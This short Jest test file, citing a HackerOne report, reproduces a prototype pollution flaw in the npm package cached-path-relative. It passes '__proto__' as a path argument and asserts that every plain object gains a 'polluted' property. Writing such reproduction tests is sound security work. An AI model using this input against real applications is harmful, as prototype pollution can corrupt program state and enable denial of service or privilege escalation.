//https://hackerone.com/reports/390847
test("prototype pollution in cached-path-relative", () => {
  expect({}.polluted).toBe(undefined);

  var relative = require("cached-path-relative");
  relative("__proto__", "polluted");

  expect({}.polluted).not.toBe(undefined);
});
